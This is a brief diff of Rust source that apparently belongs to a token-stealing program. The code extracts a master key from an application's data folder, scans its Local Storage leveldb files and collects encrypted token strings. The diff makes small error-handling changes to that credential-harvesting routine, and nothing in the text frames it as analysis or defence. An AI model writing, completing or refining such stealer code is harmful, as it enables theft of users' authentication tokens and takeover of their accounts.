@@ -95,7 +95,7 @@ where
         if let Some(master_key) = unsafe { extract_master_key(path) } {
             let scan_path = path / s!("Local Storage") / s!("leveldb");
 
-            if !(filesystem.is_exists(&scan_path) && filesystem.is_dir(&scan_path)) {
+            if !(filesystem.is_dir(&scan_path)) {
                 continue;
             }
 
@@ -121,7 +121,7 @@ where
     })?;
 
     for entry in scannable {
-        let content = filesystem.read_file(&entry).unwrap();
+        let content = filesystem.read_file(&entry).ok()?;
         let encrypted_tokens = extract_encrypted_token_strings(&content);
 
         for encrypted_token in encrypted_tokens {
